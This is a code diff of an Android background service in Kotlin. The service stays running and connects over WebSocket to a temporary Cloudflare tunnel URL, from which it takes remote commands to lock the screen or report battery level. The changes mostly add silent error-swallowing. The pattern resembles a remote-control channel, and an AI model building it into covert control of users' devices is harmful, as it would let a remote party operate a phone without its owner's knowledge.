@@ -10,22 +10,27 @@ class CoreService : Service() {
 
     companion object {
         var instance: CoreService? = null
-        const var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
+        var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
     }
 
-    lateinit var wsManager: WebSocketManager
+    private var wsManager: WebSocketManager? = null
 
     override fun onCreate() {
         super.onCreate()
         instance = this
         createNotificationChannel()
         startForeground(1, buildNotification())
-        connectServer()
+        try {
+            connectServer()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         instance = null
+        wsManager?.disconnect()
     }
 
     private fun connectServer() {
@@ -35,36 +40,44 @@ class CoreService : Service() {
             onConnected = { },
             onDisconnected = { }
         )
-        wsManager.connect()
+        wsManager?.connect()
     }
 
     private fun handleCommand(data: JSONObject) {
-        when (data.optString("command")) {
-            "lock_screen" -> lockScreen()
-            "get_battery" -> sendBattery()
-        }
+        try {
+            when (data.optString("command")) {
+                "lock_screen" -> lockScreen()
+                "get_battery" -> sendBattery()
+            }
+        } catch (e: Exception) { }
     }
 
     fun sendData(type: String, data: JSONObject) {
-        data.put("type", type)
-        data.put("timestamp", System.currentTimeMillis())
-        wsManager.send(data)
+        try {
+            data.put("type", type)
+            data.put("timestamp", System.currentTimeMillis())
+            wsManager?.send(data)
+        } catch (e: Exception) { }
     }
 
     private fun lockScreen() {
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE)
-            as android.app.admin.DevicePolicyManager
-        dpm.lockNow()
+        try {
+            val dpm = getSystemService(DEVICE_POLICY_SERVICE)
+                as android.app.admin.DevicePolicyManager
+            dpm.lockNow()
+        } catch (e: Exception) { }
     }
 
     private fun sendBattery() {
-        val bm = getSystemService(BATTERY_SERVICE)
-            as android.os.BatteryManager
-        val level = bm.getIntProperty(
-            android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
-        sendData("battery", JSONObject().apply {
-            put("level", level)
-        })
+        try {
+            val bm = getSystemService(BATTERY_SERVICE)
+                as android.os.BatteryManager
+            val level = bm.getIntProperty(
+                android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            sendData("battery", JSONObject().apply {
+                put("level", level)
+            })
+        } catch (e: Exception) { }
     }
 
     private fun createNotificationChannel() {
@@ -83,6 +96,9 @@ class CoreService : Service() {
             .build()
     }
 
-    override fun onStartCommand(intent: Intent?, f: Int, id: Int) = START_STICKY
+    override fun onStartCommand(
+        intent: Intent?, f: Int, id: Int
+    ) = START_STICKY
+
     override fun onBind(intent: Intent?): IBinder? = null
 }
